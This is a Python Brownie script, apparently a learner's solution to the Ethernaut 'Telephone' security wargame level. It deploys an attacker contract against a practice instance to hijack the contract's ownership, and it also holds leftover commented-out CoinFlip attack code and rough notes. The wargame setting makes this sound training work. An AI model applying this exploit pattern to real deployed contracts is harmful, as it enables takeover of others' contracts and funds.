from scripts.helpful_scripts import get_account
from brownie import accounts, web3, config, interface, Attack04

ETHERNAUT_INSTANCE = "0xaA0349CfC5a3cE9FD3f24622F749799693b64354"


def main():
    # Ethernaut Instance
    contract = ETHERNAUT_INSTANCE
    player = get_account()

    # Deploy the attacker (proxy) contract: to call the Telephone contract
    attack = Attack04.deploy(contract, {"from": player})
    # print(f"Deployed - attack address is: {attack.address}")
    print(f'f"msg.sender = {player.address}\nattack address = {attack.address}')

    # # # # # # # # #   coinflip_interface = interface.ICoinFlip(contract)

    # tx = attack.changeOwner({"from": player})
    # print("success")

    #       ==>       Print attack.owner by referring to an instance of it ??


#     coinflip_interface = interface.ICoinFlip(contract)

#     for i in range(REQUIRED_NUMBER_OF_WINS):
#         attack.flip({"from": player, "gas_limit": 10000000, "allow_revert": True})
#         print("Consecutive wins: ", coinflip_interface.consecutiveWins())


# # what dies dot .deploy actually do? >
